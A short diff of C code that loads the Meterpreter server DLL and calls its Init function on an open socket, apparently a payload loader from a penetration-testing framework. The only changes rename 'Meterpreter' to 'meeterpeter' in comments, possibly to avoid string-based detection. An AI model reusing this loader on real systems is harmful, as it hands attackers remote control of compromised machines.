@@ -52,7 +52,7 @@ int main(int argc, char **argv)
     if (WSAStartup(MAKEWORD(2, 2), &wsa_data) != 0)
         goto cleanup;
 
-    // Load the Meterpreter DLL and get the address of the Init function
+    // Load the meeterpeter DLL and get the address of the Init function
 
     if ((lib = LoadLibrary(METSRV_DLL)) == NULL)
         goto cleanup;
@@ -60,7 +60,7 @@ int main(int argc, char **argv)
     if ((init = (init_fn)GetProcAddress(lib, "Init")) == NULL)
         goto cleanup;
 
-    // Start the Meterpreter
+    // Start the meeterpeter
 
     __try {
         init(sock);
